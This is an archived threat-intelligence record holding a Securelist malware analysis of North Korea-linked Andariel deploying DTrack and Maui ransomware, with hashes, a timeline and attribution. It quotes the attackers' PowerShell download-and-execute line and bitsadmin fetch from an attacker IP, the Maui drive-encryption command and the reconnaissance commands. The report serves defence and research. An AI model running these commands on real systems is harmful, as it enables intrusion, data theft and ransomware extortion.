{
    "id": "924f7a48-32a0-44fe-b054-5ce9f8236a6c",
    "created_at": "2023-01-12T15:03:55.177834Z",
    "updated_at": "2025-03-27T02:15:49.367024Z",
    "deleted_at": null,
    "sha1_hash": "e6fe405bf3991b7f0f36210cd5a0ad25f55954e9",
    "title": "2022-08-09 - Andariel deploys DTrack and Maui ransomware",
    "authors": "",
    "file_creation_date": "2022-08-18T03:58:49Z",
    "file_modification_date": "2022-08-18T03:58:49Z",
    "file_size": 587259,
    "plain_text": "# Andariel deploys DTrack and Maui ransomware\n\n**[securelist.com/andariel-deploys-dtrack-and-maui-ransomware/107063/](https://securelist.com/andariel-deploys-dtrack-and-maui-ransomware/107063/)**\n\nAuthors\n\n[Kurt Baumgartner](https://securelist.com/author/kurtb/)\n\nSeongsu Park\n\nOn July 7, 2022, the CISA published an alert, entitled, “North Korean State-Sponsored Cyber\nActors Use Maui Ransomware To Target the Healthcare and Public Health Sector,” related to\n[a Stairwell report, “Maui Ransomware.” Later, the Department of Justice announced that they](https://stairwell.com/wp-content/uploads/2022/07/Stairwell-Threat-Report-Maui-Ransomware.pdf)\n[had effectively clawed back $500,000 in ransom payments to the group, partly thanks to new](https://www.bankinfosecurity.com/fbi-claws-back-cryptocurrency-ransoms-paid-to-north-koreans-a-19621)\nlegislation. We can confirm a Maui ransomware incident in 2022, and add some incident and\nattribution findings.\n\nWe extend their “first seen” date from the reported May 2021 to April 15th 2021, and the\ngeolocation of the target, to Japan. Because the malware in this early incident was compiled\non April 15th, 2021, and compilation dates are the same for all known samples, this incident\nis possibly the first ever involving the Maui ransomware.\n\n\n-----\n\nWhile CISA provides no useful information in its report to attribute the ransomware to a North\nKorean actor, we determined that approximately ten hours prior to deploying Maui to the\ninitial target system, the group deployed a variant of the well-known DTrack malware to the\ntarget, preceded by 3proxy months earlier. This data point, along with others, should openly\nhelp solidify the attribution to the Korean-speaking APT Andariel, also known as Silent\nChollima and Stonefly, with low to medium confidence.\n\n## Background\n\nWe observed the following timeline of detections from an initial target system:\n\n1. 2020-12-25 Suspicious 3proxy tool\n2. 2021-04-15 DTrack malware\n3. 2021-04-15 Maui ransomware\n\n## DTrack malware\n\nMD5 739812e2ae1327a94e441719b885bd19\n\nSHA1 102a6954a16e80de814bee7ae2b893f1fa196613\n\nSHA256 6122c94cbfa11311bea7129ecd5aea6fae6c51d23228f7378b5f6b2398728f67\n\nLink time 2021-03-30 02:29:15\n\nFile type PE32 executable (GUI) Intel 80386, for MS Windows\n\nCompiler VS2008 build 21022\n\nFile size 1.2 MB\n\nFile name C:\\Windows\\Temp\\temp\\mvhost.exe\n\nOnce this malware is spawned, it executes an embedded shellcode, loading a final Windows\nin-memory payload. This malware is responsible for collecting victim information and sending\nit to the remote host. Its functionality is almost identical to previous DTrack modules. This\nmalware collects information about the infected host via Windows commands. The inmemory payload executes the following Windows commands:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n\n\"C:\\Windows\\system32\\cmd.exe\" /c ipconfig /all > \"%Temp%\\temp\\res.ip\"\n\n\"C:\\Windows\\system32\\cmd.exe\" /c tasklist > \"%Temp%\\temp\\task.list\"\n\n\"C:\\Windows\\system32\\cmd.exe\" /c netstat -naop tcp > \"%Temp%\\temp\\netstat.res\"\n\n\"C:\\Windows\\system32\\cmd.exe\" /c netsh interface show interface >\n\n\"%Temp%\\temp\\netsh.res\"\n\n\"C:\\Windows\\system32\\cmd.exe\" /c ping -n 1 8.8.8.8 > \"%Temp%\\temp\\ping.res\"\n\n\nIn addition, the malware collects browser history data, saving it to the browser.his file, just as\nthe older variant did. Compared to the old version of DTrack, the new information-gathering\nmodule sends stolen information to a remote server over HTTP, and this variant copies\nstolen files to the remote host on the same network.\n\n## Maui ransomware\n\nThe Maui ransomware was detected ten hours after the DTrack variant on the same server.\n\nMD5 ad4eababfe125110299e5a24be84472e\n\nSHA1 94db86c214f4ab401e84ad26bb0c9c246059daff\n\nSHA256 a557a0c67b5baa7cf64bd4d42103d3b2852f67acf96b4c5f14992c1289b55eaa\n\nLink time 2021-04-15 04:36:00\n\nFile type PE32 executable (GUI) Intel 80386, for MS Windows\n\nFile size 763.67 KB\n\nFile name C:\\Windows\\Temp\\temp\\maui.exe\n\nMultiple run parameters exist for the Maui ransomware. In this incident, we observe the\nactors using “-t” and “- x” arguments, along with a specific drive path to encrypt:\n\n1 C:\\Windows\\Temp\\temp\\bin\\Maui.exe -t 8 -x E:\n\nIn this case, “-t 8” sets the ransomware thread count to eight, “-x” commands the malware to\n“self melt”, and the “E:” value sets the path (the entire drive in this case) to be encrypted. The\nransomware functionality is the same as described in the Stairwell report.\n\nThe malware created two key files to implement file encryption:\n\n\n-----\n\nRSA private key C:\\Windows\\Temp\\temp\\bin\\Maui.evd\n\nRSA public key C:\\Windows\\Temp\\temp\\bin\\Maui.key\n\n## Similar DTrack malware on different victims\n\nPivoting on the exfiltration information to the adjacent hosts, we discovered additional victims\nin India. One of these hosts was initially compromised in February 2021. In all likelihood,\nAndariel stole elevated credentials to deploy this malware within the target organization, but\nthis speculation is based on paths and other artifacts, and we do not have any further details.\n\nMD5 f2f787868a3064407d79173ac5fc0864\n\nSHA1 1c4aa2cbe83546892c98508cad9da592089ef777\n\nSHA256 92adc5ea29491d9245876ba0b2957393633c9998eb47b3ae1344c13a44cd59ae\n\n\nLink\ntime\n\nFile\ntype\n\n\n2021-02-22 05:36:16\n\nPE32 executable (GUI) Intel 80386, for MS Windows\n\n\nFile size 848 KB\n\nThe primary objective of this malware is the same as in the case of the aforementioned\nvictim in Japan, using different login credentials and local IP address to exfiltrate data.\n\n**_Windows commands to exfiltrate data_**\n\nFrom the same victim, we discovered additional DTrack malware (MD5\n87e3fc08c01841999a8ad8fe25f12fe4) using different login credentials.\n\n## Additional DTrack module and initial infection method\n\nThe [“3Proxy” tool, likely utilized by the threat actor, was compiled on 2020-09-09 and](https://3proxy.ru/)\ndeployed to the victim on 2020-12-25. Based on this detection and compilation date, we\nexpanded our research scope and discovered an additional DTrack module. This module\nwas compiled 2020-09-16 14:16:21 and detected in early December 2020, having a similar\ntimeline to the 3Proxy tool deployment.\n\n\n-----\n\nMD5 cf236bf5b41d26967b1ce04ebbdb4041\n\nSHA1 feb79a5a2bdf0bcf0777ee51782dc50d2901bb91\n\nSHA256 60425a4d5ee04c8ae09bfe28ca33bf9e76a43f69548b2704956d0875a0f25145\n\nLink time 2020-09-16 14:16:21\n\nFile type PE32 executable (GUI) Intel 80386, for MS Windows\n\nCompiler VS2008 build 21022\n\nFile size 136 KB\n\nFile name %appdata%\\microsoft\\mmc\\dwem.cert\n\nThis DTrack module is very similar to the EventTracKer module of DTrack, which was\npreviously reported to our Threat Intelligence customers. In one victim system, we\ndiscovered that a well-known simple HTTP server, [HFS7, had deployed the malware above.](https://www.rejetto.com/hfs/)\nAfter an unknown exploit was used on a vulnerable HFS server and “whoami” was executed,\nthe Powershell command below was executed to fetch an additional Powershell script from\nthe remote server:\n\n1 C:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object\nNet.WebClient).DownloadString('hxxp://145.232.235[.]222/usr/users/mini.ps1')\n\nThe mini.ps1 script is responsible for downloading and executing the above DTrack malware\nvia bitsadmin.exe:\n\n\n1\n\n2\n\n\nbitsadmin.exe /transfer myJob /download /priority high\n\n\"hxxp://145.232.235[.]222/usr/users/dwem.cert\"\n\"%appdata%\\microsoft\\mmc\\dwem.cert\"\n\n\nThe other victim operated a vulnerable Weblogic server. According to our telemetry, the actor\ncompromised this server via the CVE-2017-10271 exploit. We saw Andariel abuse identical\nexploits and compromise WebLogic servers in mid-2019, and previously reported this activity\nto our Threat Intelligence customers. In this case, the exploited server executes the\nPowershell command to fetch the additional script. The fetched script is capable of\ndownloading a Powershell script from the server we mentioned above\n(hxxp://145.232.235[.]222/usr/users/mini.ps1). Therefore, we can summarize that the actor\nabused vulnerable Internet-facing services to deploy their malware at least until the end of\n2020.\n\n\n-----\n\n## Victims\n\nThe July 2022 CISA alert noted that the healthcare and public health sectors had been\ntargeted with the Maui ransomware within the US. However, based on our research, we\nbelieve this operation does not target specific industries and that its reach is global. We can\nconfirm that the Japanese housing company was targeted with the Maui ransomware on\nApril 15, 2021. Also, victims from India, Vietnam, and Russia were infected within a similar\ntimeframe by the same DTrack malware as used in the Japanese Maui incident: from the end\nof 2020 to early 2021.\n\nOur research suggests that the actor is rather opportunistic and could compromise any\ncompany around the world, regardless of their line of business, as long as it enjoys good\nfinancial standing. It is probable that the actor favors vulnerable Internet-exposed web\nservices. Additionally, the [Andariel deployed ransomware selectively to make financial](https://securelist.com/andariel-evolves-to-target-south-korea-with-ransomware/102811/)\nprofits.\n\n## Attribution\n\nAccording to the Kaspersky Threat Attribution Engine (KTAE), the DTrack malware from the\nvictim contains a high degree of code similarity (84%) with previously known DTrack\nmalware.\n\nAlso, we discovered that the DTrack malware (MD5 739812e2ae1327a94e441719b885bd19)\nemploys the same shellcode loader as “Backdoor.Preft” malware (MD5\n[2f553cba839ca4dab201d3f8154bae2a), published/reported by Symantec – note that](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/stonefly-north-korea-espionage)\nSymantec recently described the Backdoor.Preft malware as “aka Dtrack, Valefor”. Apart\nfrom the code similarity, the actor used 3Proxy tool (MD5\n5bc4b606f4c0f8cd2e6787ae049bf5bb), and that tool was also previously employed by the\n\n\n-----\n\nAndariel/StoneFly/Silent Chollima group (MD5 95247511a611ba3d8581c7c6b8b1a38a).\nSymantec attributes StoneFly as the North Korean-linked actor behind the DarkSeoul\nincident.\n\n## Conclusions\n\nBased on the modus operandi of this attack, we conclude that the actor’s TTPs behind the\nMaui ransomware incident is remarkably similar to past Andariel/Stonefly/Silent Chollima\nactivity:\n\nUsing legitimate proxy and tunneling tools after initial infection or deploying them to\nmaintain access, and using Powershell scripts and Bitsadmin to download additional\nmalware;\nUsing exploits to target known but unpatched vulnerable public services, such as\nWebLogic and HFS;\nExclusively deploying DTrack, also known as Preft;\nDwell time within target networks can last for months prior to activity;\nDeploying ransomware on a global scale, demonstrating ongoing financial motivations\nand scale of interest\n\n[Andariel](https://securelist.com/tag/andariel/)\n[APT](https://securelist.com/tag/apt/)\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[Malware Technologies](https://securelist.com/tag/malware-technologies/)\n[Nation State Sponsored Espionage](https://securelist.com/tag/nation-state-sponsored-espionage/)\n[Ransomware](https://securelist.com/tag/ransomware/)\n\nAuthors\n\n[Kurt Baumgartner](https://securelist.com/author/kurtb/)\n\nSeongsu Park\n\nAndariel deploys DTrack and Maui ransomware\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-09 - Andariel deploys DTrack and Maui ransomware.pdf"
    ],
    "report_names": [
        "2022-08-09 - Andariel deploys DTrack and Maui ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "838f6ced-12a4-4893-991a-36d231d96efd",
            "created_at": "2022-10-25T15:50:23.347455Z",
            "updated_at": "2025-03-27T02:00:55.449316Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "Andariel",
                "Silent Chollima",
                "PLUTONIUM",
                "Onyx Sleet"
            ],
            "source_name": "MITRE:Andariel",
            "tools": [
                "Rifdoor",
                "gh0st RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "110e7160-a8cc-4a66-8550-f19f7d418117",
            "created_at": "2023-01-06T13:46:38.427592Z",
            "updated_at": "2025-03-27T02:00:02.830659Z",
            "deleted_at": null,
            "main_name": "Silent Chollima",
            "aliases": [
                "Subgroup: Andariel",
                "Onyx Sleet",
                "PLUTONIUM",
                "OperationTroy",
                "Guardian of Peace",
                "GOP",
                "WHOis Team",
                "Andariel"
            ],
            "source_name": "MISPGALAXY:Silent Chollima",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4a502340-ae29-4a3a-8142-7fbbc2ec79b5",
            "created_at": "2024-05-01T02:03:08.138302Z",
            "updated_at": "2025-03-27T02:05:17.416542Z",
            "deleted_at": null,
            "main_name": "NICKEL HYATT",
            "aliases": [
                "Dark Seoul",
                "Jumpy Pisces ",
                "Onyx Sleet ",
                "RIFLE Campaign",
                "Silent Chollima ",
                "Andariel"
            ],
            "source_name": "Secureworks:NICKEL HYATT",
            "tools": [
                " DTrack",
                " Rifle",
                " UnitBot",
                " Valefor",
                "ActiveX 0-day"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "68cc6e37-f16d-4995-a75b-5e8e2a6cbb3d",
            "created_at": "2024-05-01T02:03:07.943593Z",
            "updated_at": "2025-03-27T02:05:17.259709Z",
            "deleted_at": null,
            "main_name": "BRONZE EDISON",
            "aliases": [
                "DarkSeoul",
                "Maverick Panda ",
                "Sykipot ",
                "TG-0623 ",
                "getkys",
                "APT4 "
            ],
            "source_name": "Secureworks:BRONZE EDISON",
            "tools": [
                " Wkysol",
                " ZxPortMap",
                "Gh0st RAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bc6e3644-3249-44f3-a277-354b7966dd1b",
            "created_at": "2022-10-25T16:07:23.760559Z",
            "updated_at": "2025-03-27T02:02:09.968605Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "APT 45",
                "Andariel",
                "Jumpy Pisces",
                "Onyx Sleet",
                "Operation BLACKMINE",
                "Operation BLACKSHEEP/Phase 3.",
                "Operation Blacksmith",
                "Operation DESERTWOLF/Phase 3",
                "Operation GHOSTRAT",
                "Operation GoldenAxe",
                "Operation INITROY/Phase 1",
                "Operation INITROY/Phase 2",
                "Operation Mayday",
                "Operation VANXATM",
                "Operation XEDA",
                "Plutonium",
                "Silent Chollima",
                "Stonefly"
            ],
            "source_name": "ETDA:Andariel",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535835,
    "ts_updated_at": 1743041749,
    "ts_creation_date": 1660795129,
    "ts_modification_date": 1660795129,
    "files": {
        "pdf": "https://archive.orkl.eu/e6fe405bf3991b7f0f36210cd5a0ad25f55954e9.pdf",
        "text": "https://archive.orkl.eu/e6fe405bf3991b7f0f36210cd5a0ad25f55954e9.txt",
        "img": "https://archive.orkl.eu/e6fe405bf3991b7f0f36210cd5a0ad25f55954e9.jpg"
    }
}